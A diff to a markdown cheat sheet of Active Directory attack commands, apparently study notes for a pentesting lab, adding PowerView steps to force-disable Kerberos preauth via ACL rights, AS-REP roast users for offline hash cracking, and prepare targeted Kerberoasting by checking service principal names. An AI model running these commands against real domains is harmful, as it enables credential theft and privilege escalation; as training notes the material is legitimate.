@@ -599,5 +599,24 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 **Force disable Kerberos Preauth**
 - Lets enumerate the permissions for RDPUsers on ACLs using PowerView
   - `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
-  - `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
+- Forcefully disable preauth where we have the permission to do so
+  - `Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose`
   - `Get-DomainUser -PreauthNotRequired -Verbose` 
+
+**Request encrypted AS-REP for offline brute-force**
+- Lets use ASREPRoast
+  - `Get-ASREPHash -UserName <USERNAME> -Verbose`
+
+- To enumerate all users with Kerberos preauth disabled and request a hash
+  - `Invoke-ASREPRoast -Verbose`
+
+**Priv Esc - Targeted Kerberoastig - Set SPN**
+- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain)
+- We can then request a TGS without special privileges. The TGS can then be 'Kerberoasted'.
+
+- Lets enumerate the permissions for RDPUsers on ACLs using PowerView
+  - `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
+- Using Powerview, see if the user already has a SPN. 
+  - `Get-DomainUser -Identity supportuser | select serviceprincipalname`
+ - Using ActiveDirectory module.
+  - `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
